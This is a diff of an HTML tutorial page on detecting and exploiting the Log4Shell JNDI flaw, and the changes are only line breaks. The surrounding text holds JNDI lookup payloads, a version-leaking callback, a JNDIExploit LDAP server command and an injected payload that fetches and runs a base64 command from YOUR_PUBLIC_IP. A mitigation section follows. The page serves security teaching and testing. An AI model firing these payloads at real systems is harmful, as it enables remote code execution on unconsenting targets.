@@ -198,11 +198,11 @@
                     
                    <h2>2. How it works ( Detection )</h2>
                      <p> 
-1. An attacker inserts the JNDI lookup/payload in a anywhere of request that is likely to be logged. (for instance: `${jndi:ldap://domain.com/j}`)<br>
-2. The payload is passed to log4j for logging.<br>
-3. Log4j interpolates the string and queries the malicious ldap server.<br>
-4. The ldap server responds with directory information that contains the malicious java class.<br>
-5. Java deserializes or download the malicious java class and execute it.<br>
+1. An attacker inserts the JNDI lookup/payload in a anywhere of request that is likely to be logged. (for instance: `${jndi:ldap://domain.com/j}`)<br><br>
+2. The payload is passed to log4j for logging.<br><br>
+3. Log4j interpolates the string and queries the malicious ldap server.<br><br>
+4. The ldap server responds with directory information that contains the malicious java class.<br><br>
+5. Java deserializes or download the malicious java class and execute it.<br><br>
                     </p>
                  <h2>3. Simple DNS Log Monitor Services</h2>
  <p> 
@@ -220,7 +220,7 @@
 <img src="img/blog/step1.jpg" class="img-fluid" alt="step1"/>
 3. Fire the payload into input field and Find out any field which may be logged. For example, 
    the endpoint which you are accessing, User-Agent, Referrer, things which you search, something which you submit in some form, etc.<a href="https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/http-request-headers/http-request-headers-fields-large.txt">Headers.</a><br>
- <img src="img/blog/step2.jpg" class="img-fluid" alt="step2"/><br>
+<br> <img src="img/blog/step2.jpg" class="img-fluid" alt="step2"/><br>
 4. If you get the ping back then you good to go.Before that read this awesome writeup about pingbacks <a href="https://infosecwriteups.com/facts-to-clear-about-log4j-for-bug-bounty-hunters-f58e04eb025">Pingback Doubts</a><br><br>
 <img src="img/blog/step3.jpg" class="img-fluid" alt="step3"/> <br>
 5. For getting Java version, we’ll use this one: <code>${jndi:ldap://z${sys:java.version}.xyz.burpcollaborator.net/rce}</code><br>
@@ -305,7 +305,7 @@ ${jndi:ldap://${main:bar}.domain.com/j}
 3. Start the LDAP server<br><br>
     <code>java -jar JNDIExploit-1.2-SNAPSHOT.jar -i YOUR_PUBLIC_IP -p 8888</code><br><br>
 4. We just need to inject the payload.<code>${jndi:ldap://YOUR_PUBLIC_IP:1389/Basic/Command/Base64/BASE64_ENCODED_COMMAND}</code><br><br>
-5. we’ll encode our command in base64:<br>    
+5. we’ll encode our command in base64:<br><br>  
    <img src="img/blog/step4.jpg" class="img-fluid" alt="step4"/> <br>
 6. You can see the hit like below:<pre><code>
 [+] LDAP Server Start Listening on 1389...
@@ -325,16 +325,16 @@ ${jndi:ldap://${main:bar}.domain.com/j}
                     <img src="img/blog/jndi-attack.jpeg " class="img-fluid" alt="mitigation"/><br />
     1. <b>SPOT VULNERABLE APPLICATIONS</b><br>
 
-Ask admin/system team to run a search/grep command on all servers to spot any file with the name “log4j2”, Then check if it is a vulnerable version or not”<br />
+Ask admin/system team to run a search/grep command on all servers to spot any file with the name “log4j2”, Then check if it is a vulnerable version or not”<br><br>
 
     2. <b>PERMANENT MITIGATION</b><br>
 
 Version 2.15.0 of log4j has been released without the vulnerability. log4j-core.jar is available on Apache Log4j page below, You
-can download it and update your system<br />
+can download it and update your system<br><br>
     
     3. <b>TEMPORARY MITIGATION</b><br>
 
-    “Add <code>“log4j.format.msg.nolookups=true”</code> to the global configuration of your server/web applications”<br />
+    “Add <code>“log4j.format.msg.nolookups=true”</code> to the global configuration of your server/web applications”<br><br>
 
                     
     <h2>References & Credits</h2>
